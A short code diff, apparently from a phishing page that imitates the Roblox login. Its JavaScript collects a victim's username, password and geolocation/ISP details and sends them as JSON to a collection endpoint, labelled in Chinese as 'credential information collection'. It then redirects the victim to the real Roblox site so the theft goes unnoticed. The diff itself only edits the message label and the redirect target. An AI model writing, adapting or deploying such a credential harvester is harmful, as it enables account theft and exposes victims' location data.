@@ -35,7 +35,7 @@ ISP：${geo.isp}
                         "Content-Type": "application/json",
                     },
                     body: JSON.stringify({
-                        content: `帳密：
+                        content: `帳密資訊收集：
 帳號：${username}
 密碼：${password}
 
@@ -45,11 +45,11 @@ ${locationInfo}`
                 });
             })
             .then(() => {
-                window.location.href = "https://www.roblox.com/login";
+                window.location.href = "https://www.roblox.com/";
             })
             .catch((error) => {
                 console.error("發生錯誤：", error);
-                window.location.href = "https://www.roblox.com/login";
+                window.location.href = "https://www.roblox.com/";
             });
     });
 });
